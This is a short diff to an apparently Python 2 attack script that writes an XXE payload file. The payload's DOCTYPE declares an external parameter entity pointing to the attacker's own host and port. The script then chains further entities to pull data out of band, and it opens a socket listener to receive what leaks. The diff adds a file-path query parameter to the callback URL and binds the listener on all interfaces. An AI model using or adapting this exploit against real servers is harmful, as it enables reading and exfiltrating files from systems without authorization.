@@ -24,7 +24,7 @@ HOST =line.split("<")[6].split().pop()
 #Creating Xml file
 xml="""<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "http://{}:{}/xml">
+<!ENTITY % remote SYSTEM "http://{}:{}/xml?f=FULLPATH">
 %remote;
 %int;
 %trick;]>
@@ -36,7 +36,7 @@ print "[+]Saved data to XXE.xml"
 
 #listen to the server fart :D
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((HOST, PORT))
+s.bind(('', int(PORT)))
 s.listen(2)
 print "[+]Listening on "+str(HOST)+":"+str(PORT)+"\n"
 
